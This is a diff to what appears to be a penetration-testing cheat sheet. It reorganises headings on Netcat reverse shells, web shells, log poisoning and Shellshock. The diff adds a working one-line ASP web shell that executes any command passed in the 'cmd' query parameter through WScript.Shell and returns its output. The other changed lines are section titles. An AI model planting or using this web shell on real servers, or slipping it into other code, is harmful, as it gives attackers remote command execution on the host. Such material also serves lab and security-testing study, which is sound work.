@@ -6,11 +6,13 @@
   * [Netcat Linux](#Netcat-Linux)
   * [Netcat Windows](#Netcat-Windows)
   * [Netcat URL Encoding](#Netcat-URL-Encoding)
-- [PHP Web Shell](#PHP-Web-Shell)
-  * [Basic](#Basic)
-  * [Log Poisoning](#Log-Poisoning)
-    * [SSH](#Log-Poisoning-SSH)
-    * [HTTP](#Log-Poisoning-HTTP)
+- [WebShell](#WebShell)
+  * [ASP WebShell](#ASP-WebShell)
+  * [PHP WebShell](#PHP-WebShell)
+    * [Basic](#Basic)
+  * [Log Poisoning WebShell](#Log-Poisoning-WebShell)
+      * [SSH](#Log-Poisoning-SSH)
+      * [HTTP](#Log-Poisoning-HTTP)
 - [UnrealIRCd](#UnrealIRCd)
 - [Shellshock](#Shellshock)
   * [SSH](#Shellshock-SSH)
@@ -106,7 +108,15 @@
   
   ---
   
-  ### PHP Web Shell
+  ### WebShell
+  
+  ### ASP WebShell
+  
+  ```asp
+  <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
+  ```
+  
+  ### PHP WebShell
   
   ### Basic
 
@@ -116,7 +126,7 @@
   
   ---
   
-  ### Log Poisoning
+  ### Log Poisoning WebShell
   
   ### Log Poisoning SSH
   
